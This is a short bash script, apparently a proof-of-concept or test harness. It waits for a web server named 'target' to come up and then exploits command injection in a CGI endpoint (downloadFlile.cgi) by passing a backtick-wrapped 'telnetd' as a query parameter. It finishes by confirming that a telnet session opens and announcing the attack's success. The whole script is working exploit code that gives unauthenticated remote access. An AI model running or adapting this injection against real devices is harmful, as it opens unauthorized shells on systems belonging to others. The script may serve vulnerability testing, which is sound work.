#!/bin/bash
set -e

TARGET=target

echo "Waiting for target to boot..."
while [[ "$(curl -m 1 -s -o /dev/null -w ''%{http_code}'' ${TARGET}:80)" != "200" ]]; do sleep 2; done

echo "Server started! Attacking..."
curl 'http://'"${TARGET}"'/cgi-bin/downloadFlile.cgi?payload=`telnetd`' || true
echo "" | telnet ${TARGET} | grep "Connected to target" &> /dev/null
echo "Attack succeeded with telnet opened"
